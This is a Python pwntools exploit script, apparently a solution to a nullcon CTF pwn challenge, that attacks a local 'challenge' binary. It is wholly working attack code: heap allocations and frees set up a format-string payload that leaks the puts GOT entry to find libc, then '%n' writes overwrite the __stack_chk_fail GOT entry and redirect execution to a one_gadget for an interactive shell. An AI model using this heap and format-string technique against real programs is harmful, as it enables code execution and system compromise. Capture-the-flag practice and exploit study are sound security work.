#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Distributed under terms of the MIT license.
from pwn import*
context(os='linux',arch='amd64')#,log_level='debug')
n = process('./challenge')
# n = remote('pwn.ctf.nullcon.net',4002)
elf = ELF('./challenge')
libc = elf.libc
# libc = ELF('./libc.so.6')

def choice(idx):
    n.recvuntil('> ')
    n.sendline(str(idx))

def add(size,content,price):
    choice(1)
    n.recvuntil('length: ')
    n.sendline(str(size))
    n.recvuntil('name: ')
    n.sendline(content)
    n.recvuntil('price: ')
    n.sendline(str(price))

def free(idx):
    choice(2)
    n.recvuntil('index: ')
    n.sendline(str(idx))

def show():
    choice(3)

puts_got = elf.got['puts']
fc = elf.got['__stack_chk_fail']
cp_stmt = 0x6020a0

add(0x10,'0000',0x10)
add(0x10,'1111',0x10)
free(1)
free(0)
payload = p64(puts_got)+p64(0)*2+"%7$s"
# payload = 'aaaa'+'\x00'*0x14+'%7$x'
add(0x38,payload,0x10)
show()
n.recvuntil('price": 0,\n')
n.recvuntil('rights\": \"')
libc_base = u64(n.recv(6)+'\x00\x00') - libc.sym['puts']
print "libc_base:",hex(libc_base)


one_gadget = libc_base + 0x4f322
add(0x10,'aaaa',0x10)
add(0x10,'bbbb',0x10)

free(2)
payload = p64(fc)+'\x00'*0x10+"%113c%7$n"
add(0x38,payload,0x10)
show()

free(2)
payload = p64(cp_stmt+8) + p64(fc+8)+p64(0)+"%113c%7$n"
add(0x38,payload,0x10)
show()

free(1)
#gdb.attach(n)
# add(0x60,p64(one_gadget)*0x10,12)
choice(1)
n.sendline(str(0x60))
n.sendline(p64(one_gadget)*0x10)

n.interactive()
